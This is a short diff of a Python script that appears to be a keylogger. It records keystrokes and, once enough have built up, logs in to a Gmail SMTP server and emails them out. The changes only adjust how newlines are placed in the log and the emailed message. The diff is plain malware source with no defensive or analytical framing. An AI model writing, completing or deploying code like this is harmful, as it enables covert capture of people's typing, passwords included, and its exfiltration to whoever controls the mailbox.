@@ -37,7 +37,7 @@ def sendMail(email,password, msg):
     try:
         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
             server.login(email, password)
-            server.sendmail(email,email,msg)
+            server.sendmail(email,email,f"\n\n{msg}") #\n\n' works to ensure that the keystrokes show up as the message,
     except:
         print("\n Something Went Wrong Check To See Whether Your Email Or Password is Right")
 
@@ -52,7 +52,7 @@ def keystroke(key):
 
     #Keystrokes message sender
     if key not in numLet:
-        log+= '\n\n' f"{keyLog}"   # '\n\n' works to ensure that the keystrokes show up as the message
+        log+= f"{keyLog}\n"
         keyLog = ""
         if len(log.split()) >= (char_length):
             sendMail(Email, password, log)
